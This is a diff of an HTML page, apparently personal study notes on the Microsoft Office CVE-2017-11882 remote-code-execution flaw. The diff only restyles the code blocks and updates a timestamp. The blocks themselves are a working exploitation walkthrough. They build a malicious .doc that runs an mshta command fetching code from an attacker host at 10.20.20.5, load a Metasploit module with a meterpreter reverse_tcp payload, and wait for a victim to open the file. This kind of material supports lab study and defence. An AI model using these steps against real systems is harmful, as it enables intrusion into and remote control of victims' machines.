@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-02-02 Thu 21:55 -->
+<!-- 2023-02-15 Wed 22:05 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-11882</title>
@@ -72,11 +72,11 @@ CVE-2017-1188 是微软公布的一个远程执行漏洞，通杀目前市面上
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">unzip CVE-2017-11882.zip
-python CVE-2017-11882/cve-2017-11882.py -c "cmd.exe /c calc.exe" -c "calc.doc" # test
-python CVE-2017-11882/cve-2017-11882.py -c "mshta http://10.20.20.5:8080/path" -c "classTable.doc"
-cp CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
-cp CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
+<pre class="src src-bash"><span style="color: #006DAF;">unzip</span> CVE-2017-11882.zip
+<span style="color: #006DAF;">python</span> CVE-2017-11882/cve-2017-11882.py <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"cmd.exe /c calc.exe"</span> <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"calc.doc"</span> <span style="color: #8D8D84; font-style: italic;"># test</span>
+<span style="color: #006DAF;">python</span> CVE-2017-11882/cve-2017-11882.py <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"mshta http://10.20.20.5:8080/path"</span> <span style="color: #D0372D;">-c</span> <span style="color: #008000;">"classTable.doc"</span>
+<span style="color: #006DAF;">cp</span> CVE-2017-11882/cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/
+<span style="color: #006DAF;">cp</span> CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/msfconsole
 </pre>
 </div></li>
 
@@ -84,17 +84,17 @@ cp CVE-2017-11882/cve_2017_11882.rb /usr/share/metasploit-framework/modules/expl
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">reload_all
-search CVE-2017-11882
-use exploit/windows/smb/cve_2017_11882
-set payload windows/meterpreter/reverse_tcp
-set lhost 10.20.20.5
-set uripath path
-run # exploit
-# wait for target to open the 'classTable.doc' documnet
-# open or edit the 'calc.doc' will open calc.exe in Windows 7
-# but only edit the 'calc.doc' will open calc.exe in Windows 10
-# PS: Windows 10 must close Windows Defender
+<pre class="src src-bash"><span style="color: #006DAF;">reload_all</span>
+<span style="color: #006DAF;">search</span> CVE-2017-11882
+<span style="color: #006DAF;">use</span> exploit/windows/smb/cve_2017_11882
+<span style="color: #006FE0;">set</span> payload windows/meterpreter/reverse_tcp
+<span style="color: #006FE0;">set</span> lhost 10.20.20.5
+<span style="color: #006FE0;">set</span> uripath path
+<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
+<span style="color: #8D8D84; font-style: italic;"># wait for target to open the 'classTable.doc' documnet</span>
+<span style="color: #8D8D84; font-style: italic;"># open or edit the 'calc.doc' will open calc.exe in Windows 7</span>
+<span style="color: #8D8D84; font-style: italic;"># but only edit the 'calc.doc' will open calc.exe in Windows 10</span>
+<span style="color: #8D8D84; font-style: italic;"># PS: Windows 10 must close Windows Defender</span>
 </pre>
 </div></li>
 </ol>
